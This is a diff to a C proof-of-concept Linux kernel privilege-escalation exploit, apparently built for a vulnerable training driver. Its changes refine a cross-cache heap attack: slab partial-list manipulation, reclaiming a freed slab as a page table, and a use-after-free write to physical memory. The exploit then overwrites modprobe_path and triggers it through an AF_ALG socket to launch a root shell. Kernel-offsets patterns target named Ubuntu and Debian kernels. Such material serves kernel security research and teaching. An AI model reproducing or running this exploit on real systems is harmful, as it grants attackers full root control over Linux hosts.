@@ -14,9 +14,7 @@
  * You may also compile the kernel with CONFIG_PAGE_TABLE_CHECK and CONFIG_TRANSPARENT_HUGEPAGE,
  * since this PoC can bypass them combined.
  *
- * Requirements:
- *  1) Enable CONFIG_CRYPTO_USER_API to exploit the modprobe_path LPE technique
- *  2) Ensure that KERNEL_TEXT_PATTERNS contains the first bytes of _text of your kernel
+ * Ensure that KERNEL_TEXT_PATTERNS contains the first bytes of _text of your kernel.
  */
 
 #define _GNU_SOURCE
@@ -83,28 +81,66 @@ int act(int act_fd, int code, int n, char *args)
 }
 
 /*
- * Cross-cache attack:
- *  - collect the needed info:
- *      /sys/kernel/slab/kmalloc-rnd-04-96/cpu_partial
- *        120
- *      /sys/kernel/slab/kmalloc-rnd-04-96/objs_per_slab
- *        42
- *  - pin the process to a single CPU
- *  - prepare the page table infrastructure
- *  - create new active slab, allocate objs_per_slab objects
- *  - allocate (objs_per_slab * cpu_partial) objects to later overflow the partial list
- *  - create new active slab, allocate objs_per_slab objects
- *  - obtain dangling reference from use-after-free bug
- *  - create new active slab, allocate objs_per_slab objects
- *  - free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object
- *  - free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list
- *  - create a page table to reclaim the freed memory
- *  - perform uaf write using the dangling reference
- *  - change modprobe_path using the overwritten page table
+ * Collect the needed info for a cross-cache attack:
+ *
+ *  - Get the number of objects per slab containing a vulnerable object
+ *    (let's call it initial slab). For example,
+ *    /sys/kernel/slab/kmalloc-rnd-01-96/objs_per_slab is 42.
  */
 #define OBJS_PER_SLAB 42
-#define CPU_PARTIAL 120
 
+/*
+ *  - Get the number of per-CPU partial slabs in the initial kmem_cache
+ *    (see it in the slub_set_cpu_partial() kernel function or simply in gdb).
+ *    For example, kmem_cache.cpu_partial_slabs for kmalloc-rnd-01-96 is 6.
+ */
+#define CPU_PARTIAL_SLABS 6
+#define CPU_PARTIAL_OBJS (OBJS_PER_SLAB * CPU_PARTIAL_SLABS)
+
+/*
+ *  - Get the required minimum number of per-node partial slabs in the initial kmem_cache.
+ *    For example, /sys/kernel/slab/kmalloc-rnd-01-96/min_partial is 5.
+ */
+#define MIN_PARTIAL 5
+
+/*
+ *  - Calculate how many times we need to move per-CPU partial slabs to per-node
+ *    partial slabs to fill at least min_partial. Without this step, an empty slab
+ *    with the vulnerable object may stuck in the per-node partial list (cross-cache
+ *    attack failure).
+ */
+#define CPU_PARTIAL_TO_NODE_PARTIAL_N ((MIN_PARTIAL + CPU_PARTIAL_SLABS - 1) / CPU_PARTIAL_SLABS)
+#define NODE_PARTIAL_OBJS (OBJS_PER_SLAB * CPU_PARTIAL_SLABS * CPU_PARTIAL_TO_NODE_PARTIAL_N)
+
+/*
+ *  - Estimate the number of holes in the initial slab cache.
+ *    It can't be precise because these number change.
+ *    Calculate (num_objs - active_objs) from /proc/slabinfo for the initial slab cache:
+ *      cat /proc/slabinfo |grep "kmalloc-rnd-..-96" | awk '{print $1, $3 - $2}'
+ *    Take the biggest number of holes and multiply it by 2, for example (just to be safe).
+ */
+#define HOLES 450
+
+/*
+ * Perform a cross-cache attack:
+ *  - prepare the page table infrastructure
+ *  - pin the process to a single CPU
+ *  - plug the holes in the initial slab cache
+ *  - allocate objects for filling the per-node partial list later
+ *  - allocate objects for filling the per-CPU partial list later
+ *  - create new active slab, allocate objs_per_slab objects
+ *  - allocate a vulnerable object
+ *  - create new active slab, allocate objs_per_slab objects
+ *  - free 1 out of each objs_per_slab objects in the slabs reserved for the per-node partial list
+ *  - free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object
+ *  - free 1 out of each objs_per_slab objects in the slabs reserved for the per-CPU partial list
+ *    (per-CPU partial list overflow pushed the slab with the uaf object to the page allocator)
+ *  - create a PUD to reclaim the freed memory
+ *  - perform uaf write using the dangling reference to the vulnerable object
+ *  - change modprobe_path using the overwritten page table
+ */
+
+/* clang-format off */
 #define PTE_INDEX_TO_VIRT(i) ((unsigned long)i << 12)
 #define PMD_INDEX_TO_VIRT(i) ((unsigned long)i << 21)
 #define PUD_INDEX_TO_VIRT(i) ((unsigned long)i << 30)
@@ -115,6 +151,7 @@ int act(int act_fd, int code, int n, char *args)
 			 PMD_INDEX_TO_VIRT(pmd_index) + \
 			 PTE_INDEX_TO_VIRT(pte_index) + \
 			 (unsigned long)page_index)
+/* clang-format on */
 
 #define PT_ENTRIES (PAGE_SIZE / 8)
 
@@ -168,8 +205,7 @@ int prepare_page_tables(void)
 		}
 	}
 	printf("[+] mmap 4 KiB for each PUD entry: from %p to %p\n",
-			PT_INDICES_TO_VIRT(PGD_N, 0, 0, 0, 0),
-			PT_INDICES_TO_VIRT(PGD_N, i, 0, 0, 0));
+	       PT_INDICES_TO_VIRT(PGD_N, 0, 0, 0, 0), PT_INDICES_TO_VIRT(PGD_N, i, 0, 0, 0));
 
 	return EXIT_SUCCESS;
 }
@@ -295,12 +331,14 @@ int get_modprobe_path(char *buf, size_t buf_size)
  *  2. Ubuntu 6.12.28, 6.10.11, 6.6.89,
  *  3. Debian 6.12.25, 6.11.6, 6.1.10.
  */
+/* clang-format off */
 #define KERNEL_TEXT_PATTERNS                                                  \
 	{ "\x49\x89\xf7\x48\x8d\x25\x4e\x3f\xa0\x01\xb9\x01\x01\x00\xc0\x48", \
 	  "\x49\x89\xf7\x48\x8d\x25\x4e\x3f\xa0\x01\x48\x8d\x3d\xef\xff\xff", \
 	  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90", \
 	  "\xfc\x0f\x01\x15\xa0\xdc\x77\x03\xb8\x10\x00\x00\x00\x8e\xd8\x8e", \
 	  "\x48\x8d\x25\x51\x3f\xa0\x01\x48\x8d\x3d\xf2\xff\xff\xff\xb9\x01" }
+/* clang-format on */
 
 #define KERNEL_TEXT_PATTERN_LEN 16
 
@@ -367,7 +405,8 @@ void *memmem_modprobe_path_bruteforce(void *memory, size_t memory_size)
 	}
 
 	modprobe_path_len = strlen(modprobe_path);
-	modprobe_path_uaddr = memmem(kernel_text, end - kernel_text, modprobe_path, modprobe_path_len);
+	modprobe_path_uaddr =
+		memmem(kernel_text, end - kernel_text, modprobe_path, modprobe_path_len);
 	if (modprobe_path_uaddr == NULL) {
 		printf("[!] modprobe_path is not found in this memory region\n");
 		return NULL;
@@ -387,7 +426,8 @@ void *memmem_modprobe_path_bruteforce(void *memory, size_t memory_size)
 	if (modprobe_path[0] != 'x') {
 		printf("[!] modprobe_path overwriting failed, start a new search\n");
 		/* Recursion */
-		return memmem_modprobe_path_bruteforce(modprobe_path_uaddr, end - modprobe_path_uaddr);
+		return memmem_modprobe_path_bruteforce(modprobe_path_uaddr,
+						       end - modprobe_path_uaddr);
 	}
 
 	printf("[+] testing modprobe_path overwriting succeeded\n");
@@ -395,7 +435,7 @@ void *memmem_modprobe_path_bruteforce(void *memory, size_t memory_size)
 }
 
 /* Fileless approach */
-int prepare_privesc_script(char *path, size_t path_size)
+int prepare_privesc_script(char *path, size_t path_size, char *modprobe_path)
 {
 	pid_t pid = getpid();
 	int script_fd = -1;
@@ -422,9 +462,10 @@ int prepare_privesc_script(char *path, size_t path_size)
 	}
 
 	ret = dprintf(script_fd,
-		      "#!/bin/sh\n/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n",
-		      pid, shell_stdin_fd,
-		      pid, shell_stdout_fd);
+		      "#!/bin/sh\n"
+		      "echo \"%s\" > /proc/sys/kernel/modprobe\n"
+		      "/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n",
+		      modprobe_path, pid, shell_stdin_fd, pid, shell_stdout_fd);
 	if (ret < 0) {
 		perror("[-] dprintf for privesc_script");
 		return EXIT_FAILURE;
@@ -453,13 +494,10 @@ int prepare_privesc_script(char *path, size_t path_size)
 /* See https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch */
 void trigger_modprobe_sock(void)
 {
-	struct sockaddr_alg sa = {
-		.salg_family = AF_ALG,
-		.salg_type = "dummy"
-	};
+	struct sockaddr_alg sa = { .salg_family = AF_ALG, .salg_type = "dummy" };
 	int alg_fd = -1;
 
-	printf("[!] gonna trigger modprobe using AF_ALG socket and launch the root shell\n");
+	printf("[!] triggering modprobe using AF_ALG socket to launch the root shell...\n");
 	alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
 	bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa));
 	printf("[!] root shell is finished\n");
@@ -474,12 +512,13 @@ int main(void)
 {
 	int result = EXIT_FAILURE;
 	int ret = EXIT_FAILURE;
+	char modprobe_path[KMOD_PATH_LEN] = { 0 };
+	char privesc_script_path[KMOD_PATH_LEN] = { 0 };
 	int act_fd = -1;
 	long i = 0;
 	long current_n = 0;
 	long reserved_from_n = 0;
 	long uaf_n = 0;
-	char privesc_script_path[KMOD_PATH_LEN] = { 0 };
 	unsigned long phys_addr = 0;
 	struct sysinfo info = { 0 };
 	int huge_pages_n = 0;
@@ -498,7 +537,12 @@ int main(void)
 	if (ret == EXIT_FAILURE)
 		goto end;
 
-	ret = prepare_privesc_script(privesc_script_path, sizeof(privesc_script_path));
+	ret = get_modprobe_path(modprobe_path, sizeof(modprobe_path));
+	if (ret == EXIT_FAILURE)
+		goto end;
+
+	ret = prepare_privesc_script(privesc_script_path, sizeof(privesc_script_path),
+				     modprobe_path);
 	if (ret == EXIT_FAILURE)
 		goto end;
 
@@ -512,8 +556,17 @@ int main(void)
 	if (do_cpu_pinning(0) == EXIT_FAILURE)
 		goto end;
 
-	printf("[!] create new active slab, allocate objs_per_slab objects\n");
-	for (i = 0; i < OBJS_PER_SLAB; i++) {
+	printf("[!] the cross-cache settings:\n");
+	printf("\t OBJS_PER_SLAB: %d\n", OBJS_PER_SLAB);
+	printf("\t CPU_PARTIAL_SLABS: %d\n", CPU_PARTIAL_SLABS);
+	printf("\t CPU_PARTIAL_OBJS: %d\n", CPU_PARTIAL_OBJS);
+	printf("\t MIN_PARTIAL: %d\n", MIN_PARTIAL);
+	printf("\t CPU_PARTIAL_TO_NODE_PARTIAL_N: %d\n", CPU_PARTIAL_TO_NODE_PARTIAL_N);
+	printf("\t NODE_PARTIAL_OBJS: %d\n", NODE_PARTIAL_OBJS);
+	printf("\t HOLES: %d\n", HOLES);
+
+	printf("[!] plug the holes in the initial slab cache\n");
+	for (i = 0; i < HOLES; i++) {
 		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
 			printf("[-] DRILL_ACT_ALLOC\n");
 			goto end;
@@ -523,8 +576,18 @@ int main(void)
 	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);
 	reserved_from_n = current_n;
 
-	printf("[!] allocate (objs_per_slab * cpu_partial) objects to later overflow the partial list\n");
-	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL; i++) {
+	printf("[!] allocate objects for filling the per-node partial list later\n");
+	for (i = 0; i < NODE_PARTIAL_OBJS; i++) {
+		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
+			printf("[-] DRILL_ACT_ALLOC\n");
+			goto end;
+		}
+	}
+	current_n += i;
+	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);
+
+	printf("[!] allocate objects for filling the per-CPU partial list later\n");
+	for (i = 0; i < CPU_PARTIAL_OBJS; i++) {
 		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
 			printf("[-] DRILL_ACT_ALLOC\n");
 			goto end;
@@ -543,9 +606,14 @@ int main(void)
 	current_n += i;
 	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);
 
-	printf("[!] obtain dangling reference from use-after-free bug\n");
- 	uaf_n = current_n - 1;
-	printf("[+] done, uaf_n: %ld\n", uaf_n);
+	printf("[!] allocate a vulnerable object\n");
+	if (act(act_fd, DRILL_ACT_ALLOC, current_n, NULL) == EXIT_FAILURE) {
+		printf("[-] DRILL_ACT_ALLOC\n");
+		goto end;
+	}
+	uaf_n = current_n;
+	current_n++;
+	printf("[+] done, uaf_n: %ld, current_n: %ld (next for allocating)\n", uaf_n, current_n);
 
 	printf("[!] create new active slab, allocate objs_per_slab objects\n");
 	for (i = 0; i < OBJS_PER_SLAB; i++) {
@@ -556,6 +624,15 @@ int main(void)
 	}
 	current_n += i;
 	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);
+
+	printf("[!] free 1 out of each objs_per_slab objects in the slabs reserved for the per-node partial list\n");
+	for (i = 0; i < NODE_PARTIAL_OBJS; i += OBJS_PER_SLAB) {
+		if (act(act_fd, DRILL_ACT_FREE, reserved_from_n + i, NULL) == EXIT_FAILURE) {
+			printf("[-] DRILL_ACT_FREE\n");
+			goto end;
+		}
+	}
+	printf("[+] done, next partial slab will push the per-CPU partial slabs to the per-node partial list\n");
 
 	printf("[!] free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object\n");
 	current_n--; /* point to the last allocated */
@@ -567,21 +644,21 @@ int main(void)
 		}
 	}
 	current_n -= i;
-	assert(current_n < uaf_n); /* to be sure that uaf object is freed */
+	assert(current_n < uaf_n); /* to be sure that the uaf object has been freed here */
 	printf("[+] done, current_n: %ld (next for freeing)\n", current_n);
 
-	printf("[!] free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list\n");
-	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL; i += OBJS_PER_SLAB) {
+	printf("[!] free 1 out of each objs_per_slab objects in the slabs reserved for the per-CPU partial list\n");
+	for (i = NODE_PARTIAL_OBJS; i < NODE_PARTIAL_OBJS + CPU_PARTIAL_OBJS; i += OBJS_PER_SLAB) {
 		if (act(act_fd, DRILL_ACT_FREE, reserved_from_n + i, NULL) == EXIT_FAILURE) {
 			printf("[-] DRILL_ACT_FREE\n");
 			goto end;
 		}
 	}
-	/* Now current_n should point to the last element in the reserved slabs */
-	assert(reserved_from_n + i - 1 == current_n);
-	printf("[+] done, now go for page table\n");
+	/* Now current_n should point to the first element after the reserved slabs */
+	assert(reserved_from_n + i == current_n);
+	printf("[+] done, per-CPU partial list overflow pushed the slab with the uaf object to the page allocator\n");
 
-	printf("[!] create a page table to reclaim the freed memory\n");
+	printf("[!] create a PUD to reclaim the freed memory\n");
 	for (i = 0; i < PT_ENTRIES; i++) {
 		unsigned long *addr = PT_INDICES_TO_VIRT(PGD_N, i, 0, 0, 0);
 
@@ -590,7 +667,7 @@ int main(void)
 	}
 	printf("[+] PUD has been created\n");
 
-	printf("[!] perform uaf write using the dangling reference\n");
+	printf("[!] perform uaf write using the dangling reference to the vulnerable object\n");
 	/* Start from the first GiB of physical memory */
 	ret = pud_write(phys_addr, uaf_n, act_fd);
 	if (ret == EXIT_FAILURE)
@@ -635,6 +712,7 @@ int main(void)
 			break;
 		}
 
+		printf("[!] change modprobe_path using the overwritten page table\n");
 		memcpy(modprobe_path_uaddr, privesc_script_path, new_len + 1); /* with null byte */
 		printf("[+] modprobe_path is changed to %s\n", privesc_script_path);
 
